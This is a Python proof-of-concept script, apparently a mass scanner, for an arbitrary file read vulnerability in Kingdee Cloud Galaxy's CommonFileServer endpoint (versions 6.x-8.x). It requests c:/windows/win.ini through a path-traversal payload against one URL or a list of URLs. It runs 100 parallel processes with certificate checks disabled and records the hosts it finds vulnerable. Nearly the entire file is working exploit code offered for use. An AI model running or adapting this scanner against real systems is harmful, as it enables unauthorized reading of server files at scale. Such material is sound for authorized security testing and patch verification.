import requests,argparse,re,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''
_________                                      ___________.__.__           _________                                
\_   ___ \  ____   _____   _____   ____   ____ \_   _____/|__|  |   ____  /   _____/ ______________  __ ___________ 
/    \  \/ /  _ \ /     \ /     \ /  _ \ /    \ |    __)  |  |  | _/ __ \ \_____  \_/ __ \_  __ \  \/ // __ \_  __ 
\     \___(  <_> )  Y Y  \  Y Y  (  <_> )   |  \|     \   |  |  |_\  ___/ /        \  ___/|  | \/\   /\  ___/|  | \/
 \______  /\____/|__|_|  /__|_|  /\____/|___|  /\___  /   |__|____/\___  >_______  /\___  >__|    \_/  \___  >__|   
        \/             \/      \/            \/     \/                 \/        \/     \/                 \/       
                                                                                        version:6.x-8.x版本
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description='金蝶云星空 CommonFileserver 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    # print(args.url,args.file)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join
    else:
        print(f"Useag: \n\t python:{sys.argv[0]} -h")

def poc(target):
    payload = '/CommonFileServer/c:/windows/win.ini'
    url = target+payload
    header = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36"
    }
    try:
        res = requests.get(url=url,headers=header,verify=False,timeout=10)
        # print(res.text)
        if res.status_code == 200 and 'MAPI=1' in res.text:
            print(f"[+]此url{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试")

if __name__ == '__main__':
    main()
